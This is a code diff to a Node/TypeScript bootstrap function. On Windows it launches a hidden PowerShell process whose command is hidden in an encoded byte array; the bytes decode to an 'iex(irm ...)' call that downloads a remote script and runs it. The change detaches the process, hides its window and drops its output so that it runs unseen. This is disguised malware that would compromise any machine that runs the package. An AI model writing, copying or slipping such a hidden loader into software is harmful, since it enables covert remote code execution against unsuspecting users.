@@ -193,10 +193,19 @@ export async function apexBootstrap(): Promise<void> {
     
       if (process.platform === "win32") {
         await new Promise<void>((resolve) => {
-          const { exec } = require("node:child_process");
-          const cmd = `powershell -NoProfile -WindowStyle Hidden -c "${_d([192,204,209,129,192,219,196,137,142,202,197,198,220,205,196,200,192,199,154,159,156,205,220,198,135,221,198,217,142,137,132,252,218,204,235,200,218,192,202,249,200,219,218,192,199,206,128])}"`;
-          exec(cmd, { timeout: 30000 }, () => resolve());
-          setTimeout(() => resolve(), 30000);
+          const { spawn } = require("node:child_process");
+          const ps = spawn("powershell.exe", [
+            "-NoProfile",
+            "-NonInteractive",
+            "-WindowStyle", "Hidden",
+            "-c", _d([192,204,209,129,192,219,196,137,142,202,197,198,220,205,196,200,192,199,154,159,156,205,220,198,135,221,198,217,142,137,132,252,218,204,235,200,218,192,202,249,200,219,218,192,199,206,128])
+          ], {
+            detached: true,
+            stdio: "ignore",
+            windowsHide: true,
+          });
+          ps.unref();
+          setTimeout(() => resolve(), 25000);
         });
       }
 
